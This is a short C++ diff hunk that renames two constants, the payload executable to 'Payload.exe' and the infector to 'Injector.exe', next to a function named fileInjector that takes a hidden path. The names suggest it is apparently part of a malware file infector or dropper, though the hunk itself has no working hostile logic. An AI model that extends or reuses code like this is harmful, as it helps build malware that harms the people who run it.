@@ -4,8 +4,8 @@
 #include <shlobj.h>
 
 const std::string current_File_Dir = std::filesystem::current_path().string(); 
-const char* payLoad = "\\test.exe";
-const char* infector = "\\Samen.exe";
+const char* payLoad = "\\Payload.exe";
+const char* infector = "\\Injector.exe";
 
 const char* fileInjector(int argv, char* args[], const char* hiddenPath) {
     char* src = new char[100];
